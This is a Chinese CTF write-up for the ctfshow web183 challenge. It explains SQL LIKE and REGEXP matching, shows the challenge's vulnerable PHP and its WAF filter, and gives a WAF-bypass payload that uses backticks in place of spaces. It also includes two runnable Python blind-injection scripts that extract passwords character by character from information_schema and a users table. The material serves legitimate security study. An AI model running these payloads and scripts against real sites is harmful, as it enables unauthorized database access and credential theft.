---
title: LIKE注入与盲注脚本
category: SQL注入/盲注
tags: [ctfshow, web183, like, regexp, 盲注, 服务器端爆破, 反引号]
order: 13
---

## 一句话概括

`LIKE` 是 SQL 的模糊匹配运算符，配合通配符 `%`（任意长度）和 `_`（单个字符）做前缀或包含匹配。在注入里它有两个价值：顶替被过滤的 `=`，以及用"已猜前缀 + `%`"逐字符爆破。

## 原理

### 1. LIKE 语法

```sql
SELECT * FROM table_name WHERE column_name LIKE 'pattern';
```

### 2. 两个通配符

百分号 `%` 匹配任意长度字符：

```sql
WHERE pass LIKE 'ctfshow%'    -- 以 ctfshow 开头
WHERE username LIKE '%admin%' -- 包含 admin
WHERE email LIKE '%.com'      -- 以 .com 结尾
WHERE name LIKE '%abc%'       -- 包含 abc
```

下划线 `_` 匹配单个字符：

```sql
WHERE pass LIKE 'ct_'      -- 长度 3，以 ct 开头
WHERE name LIKE '_test'    -- 第一个字符任意，后接 test
WHERE code LIKE '__a__'    -- 5 个字符，第 3 个是 a
```

### 3. 为什么爆破用"前缀 + %"

`pass LIKE 0x63746625`（即 `'ctf%'`）只判断是否存在以 `ctf` 开头的密码。把它扩展成"已猜出的整段前缀 + 新字符 + `%`"，就能一次确认这一位猜得对不对，比 `substr()` 逐位比较省一半请求。

## 本题情景与解题手法：web183

### 题目形态

页面 `POST` 一个 `tableName` 参数，后端直接拼进 `count()`：

```php
// 拼接 sql 语句查找指定 ID 用户
$sql = "select count(pass) from ".$_POST['tableName'].";";
```

WAF 极其严格：

```php
function waf($str){
    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i', $str);
}
```

翻译成人话，它拦掉了：

| 被拦的东西 | 含义 |
|---|---|
| ` ` `\x09` `\x0a` `\x0b` `\x0c` `\x0d` `\xa0` `\x00` | 几乎所有空白字符 |
| `\*` | 星号（`select *`） |
| `\#` `\x23` | `#` 注释符 |
| `=` | 等号 |
| `or` / `and` | 逻辑运算符 |
| `\x7c` | 竖线 `\|` |
| `select` / `file` / `into` / `flag` | 关键字 |

### 第一步：发现普通 payload 全都过不去

- 空格被拦，不能写 `union select 1,2`；
- `=` 被拦，不能写 `where pass = 'x'`；
- `select`、`and`、`or`、`#` 全被拦，常规注入思路报废。

### 第二步：用反引号当空格、用 like 当等号

```sql
tableName=`ctfshow_user`where`pass`like'%ctfshow%'
```

拼进去后：

```sql
select count(pass) from `ctfshow_user` where `pass` like '%ctfshow%';
```

三处关键手法：

1. 反引号代替空格：`` `ctfshow_user` `` 用反引号把标识符包起来，紧贴着 `where`，既分隔了 token，又完全不需要空格（空格被 WAF 拉黑）；
2. `like` 代替 `=`：`=` 被拉黑，但 `like` 没被拉黑，而 `like '%ctfshow%'` 本身就是一次包含匹配；
3. 避开被拉黑的关键字：全程没有 `select`、`or`、`and`、`flag`、`#`。

页面会回显 `count(pass)` 的结果，于是有了布尔判据。

### 第三步：爆破脚本

```python
import requests

url = "http://靶机地址/select-waf.php"
flagstr = "}abcdefghijklmnopqr-stuvwxyz0123456789{"
flag = ""

for i in range(0, 40):
    for x in flagstr:
        data = {
            # 用 regexp("ctfshow" + 已猜前缀 + 新字符) 做前缀匹配
            "tableName": "`ctfshow_user`where`pass`regexp(\"ctfshow{}\")".format(flag + x)
        }
        print(data)
        response = requests.post(url, data=data)
        if response.text.find("$user_count = 1;") > 0:
            print("++++++++++++++++++++={} is right".format(x))
            flag += x
            print(flag)
            break
        else:
            print("++++++++++++++++++++++++++={} is wrong".format(x))
            continue
    print(flag)
```

要点：

- 模板里的 `ctfshow` 是已知固定前缀，`{}` 处填入已猜部分加新字符；
- 判据是页面里出现 `$user_count = 1;`，匹配到的记录数为 1 说明这个字符猜对了；
- `regexp()` 与 `like` 效果类似但支持正则，`^ctfshow{a` 这种前缀锚定写法更精确。

### 注入手法一句话总结

空格被拦用反引号代替、`=` 被拦用 `like` 或 `regexp` 代替，把 `tableName` 拼成 `` `ctfshow_user`where`pass`regexp("...") ``，再用"已猜前缀 + 新字符"做前缀匹配逐位爆破。

## 通用布尔盲注脚本（附）

下面是同一题型下常用的二分法布尔盲注脚本，目标是一个 `id` 参数真实参与 SQL 的接口：

```python
import requests

url = "http://靶机地址/SUPPERAPI.php?id="
flag = ''

for i in range(1, 200):
    print("------------------" + str(i) + "------------------")
    low = 32
    high = 128
    mid = (low + high) // 2

    # 二分：不断缩小第 i 个字符的 ASCII 码范围
    while low < high:
        # 按需替换子查询目标（依次为：库名 / 表名 / 列名 / 数据）
        # payload = "2 and ascii(substr((select database()),{},1))>{}".format(i, mid)
        # payload = "2 and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))>{}".format(i, mid)
        # payload = "2 and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),{},1))>{}".format(i, mid)
        payload = "2 and ascii(substr((select group_concat(password) from users),{},1))>{}".format(i, mid)

        r = requests.get(url + payload)
        if "flag" in r.text:      # 条件为真 → 目标字符更大
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2

    if mid == 32 or mid == 127:   # 遇到边界，说明字符串结束
        break
    flag += chr(mid)
    print(flag)
```

脚本原理：

1. 用 `ascii(substr(目标,i,1)) > mid` 作为布尔条件，`mid` 取 ASCII 范围（32–128）的中点；
2. 条件为真说明目标字符在右半区，`low = mid + 1`；否则在左半区，`high = mid`；
3. 二分收敛后 `mid` 就是第 `i` 个字符的 ASCII 码；
4. 取到 `32`（空格）或 `127` 说明字符串结束，停止。

二分法每个字符约 7 次请求，比逐字符枚举（每字符最多 38 次）快得多。取数顺序仍然是标准的"库名 → 表名 → 列名 → 数据"，脚本里注释掉的那几行就是替换目标子查询的地方。

## 注意事项

- 反引号能当空格用但只对标识符有效：`` `pass` `` 可以，`pass` 和 `like` 之间没有空格靠反引号分隔；但数字或字符串之间仍需另想办法（`/**/`、`%0b` 等）。
- `like` 与 `regexp` 的区别：`like` 用 `%`、`_` 通配符，`regexp` 用正则语法（`^`、`.`、`[]`）。本题 `=` 被拦，两者都能顶上。
- 判据要看页面的具体回显：web183 是 `$user_count = 1;`，其它题可能是出现某个词、状态码变化或响应长度变化。
- `flag` 关键字被拦不影响爆破：因为匹配的是 `pass` 列的内容（形如 `ctfshow{...}`），payload 里根本不需要出现 `flag`。
- `regexp` 前缀匹配比 `substr` 更省请求，但要注意正则里的特殊字符（如 `{`、`}` 在部分实现中需转义），遇到匹配异常可以先手工验证一次。
